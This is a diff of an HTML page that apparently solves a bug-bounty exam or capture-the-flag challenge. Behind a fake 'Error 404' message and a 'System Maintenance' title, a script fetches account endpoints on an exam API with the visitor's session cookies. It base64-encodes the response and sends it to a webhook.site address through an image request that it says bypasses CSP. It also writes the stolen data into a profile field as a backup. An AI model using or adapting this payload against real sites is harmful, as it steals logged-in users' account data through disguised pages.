@@ -1,41 +1,48 @@
 <!DOCTYPE html>
 <html>
+<head><title>System Maintenance</title></head>
 <body>
     <script>
         const logger = "https://webhook.site/6222374a-b882-44ec-a12d-9671d3dd124c";
         const api = "https://api-bugbounty-exam.hashacademy.co/api";
+        const myBookingId = "69dc1bd2d9d06cf59692979e";
 
-        async function findIdentity() {
-            // Common endpoints for user info
-            const endpoints = [
-                "/auth/user",
-                "/auth/profile",
-                "/users/me",
-                "/profile"
-            ];
+        async function executeExploit() {
+            // 1. Immediate Ping to Webhook
+            new Image().src = `${logger}/?visit=bot_triggered&ts=${Date.now()}`;
+
+            const endpoints = ["/auth/me", "/auth/profile", "/users/me"];
+            let flagData = "";
 
             for (let path of endpoints) {
                 try {
                     const res = await fetch(api + path, { credentials: "include" });
-                    const data = await res.json();
-                    
                     if (res.ok) {
-                        // If we find the right path, send the whole JSON to the webhook
-                        const leaked = btoa(JSON.stringify(data));
-                        new Image().src = `${logger}/?found_path=${path}&data=${leaked}`;
+                        const json = await res.json();
+                        flagData = JSON.stringify(json);
                         
-                        // Also try to update YOUR profile with the bot's data as a backup
+                        // Send found data to Webhook via Image (Bypasses many CSPs)
+                        new Image().src = `${logger}/?path=${path}&data=${btoa(flagData)}`;
+                        
+                        // 2. BACKUP: Write the data into YOUR profile name
+                        // This allows you to see the flag just by refreshing your dashboard
                         await fetch(api + "/auth/profile", {
                             method: "PATCH",
                             headers: { "Content-Type": "application/json" },
                             credentials: "include",
-                            body: JSON.stringify({ "fullName": "FLAG_" + leaked.substring(0, 20) })
+                            body: JSON.stringify({ 
+                                "fullName": "PWN_" + flagData.substring(0, 20),
+                                "address": { "street": flagData.substring(0, 100) }
+                            })
                         });
                     }
                 } catch (e) {}
             }
         }
-        findIdentity();
+
+        executeExploit();
     </script>
+    <h1>Error 404</h1>
+    <p>Resource not found.</p>
 </body>
 </html>
